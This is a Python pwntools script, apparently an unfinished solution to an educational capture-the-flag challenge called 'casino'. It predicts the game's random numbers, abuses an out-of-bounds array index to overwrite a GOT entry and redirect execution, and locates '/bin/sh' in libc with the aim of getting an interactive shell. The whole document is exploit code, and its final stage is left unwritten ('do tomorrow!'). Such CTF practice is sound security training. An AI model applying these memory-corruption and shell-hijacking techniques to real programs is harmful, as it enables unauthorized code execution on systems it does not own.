# Please run with python2.7 for better compatibility
'''
0000000000601ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
0x21ab0 libc_start_main
'''
from pwn import *

context.clear(arch='x86_64')

# name
name = '\x00' * 16

# random number
l = process('./gen_num.out')
numbers = l.recvall().decode().split('\n')
del numbers[-1]
l.close()

# calculate offset for system library
elf = ELF('./casino')
libc = ELF('./libc-2.23.so')
binsh_offset = next(libc.search('/bin/sh')) # - libc.symbols['system']

pop_call_offset = 0x107419
main = 0x400564
casino = 0x40095d
name += p64(0x601ff0)

# libc_base_addr = ???? - 0x21ab0
print(hex(binsh_offset))

r = process("./casino")
# r = remote('edu-ctf.csie.org', 10176)
r.sendlineafter('name: ', name)
r.sendlineafter('age: ', '87')

step = 1
while True:

    # Step 1: make call puts change back to call casino, and we can hijack srand to make it printf
    if step == 1:
        for i in range(0, 6):
            r_out = 'Chose the number ' + str(i) + ': '
            r.sendlineafter(r_out, str(i))

        offset = (0x20 - 0xd0) / 4
        r.sendlineafter('0:no]:', '1')

        r.sendlineafter('6]:', str(offset + 1))

        r_out = 'Chose the number ' + str(offset) +': '
        # hijack = p64(casino)
        hijack = casino
        r.sendlineafter(r_out, str(hijack))
        print('finished sending number and payload for step  %d: ' % (step))
        step += 1
    elif step == 2:
        cnt_num = 0
        for i in numbers:
            r_out = 'Chose the number ' + str(cnt_num) + ': '
            r.sendlineafter(r_out, str(i))
            cnt_num += 1

        offset = (0x20 - 0xd0) / 4
        r.sendlineafter('0:no]:', '1')

        pause()
        r.sendlineafter('6]:', str(offset + 2))

        r_out = 'Chose the number ' + str(offset + 1) +': '
        r.sendlineafter(r_out, '0')
        print('finished sending number and payload for step  %d: ' % (step))
        step += 1
    # do tomorrow!
    elif step == 3:
        exit()

r.interactive()
r.close()

